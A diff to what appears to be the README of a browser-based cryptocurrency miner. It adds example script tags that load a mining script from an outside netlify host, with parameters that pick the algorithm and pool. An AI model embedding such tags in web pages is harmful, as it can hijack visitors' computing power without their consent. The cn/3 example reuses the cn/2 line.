@@ -7,7 +7,15 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 
 #### Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 
+#### Examples: CN R Coins (Fork 09march19) (Monero, Lethean) need ?algo=cn/r<br> 
+```sh
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=Your_Favorite_Pool:PortNr" > </script>
+```
 #### Examples: CN V8 Coins (Monero, Lethean, Graft) need ?algo=cn/2<br> 
+```sh
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/2?jason=Your_Favorite_Pool:PortNr" > </script>
+```
+#### Examples: CN V8 Coins with custom POW (Graft coming soon) need ?algo=cn/3<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/2?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
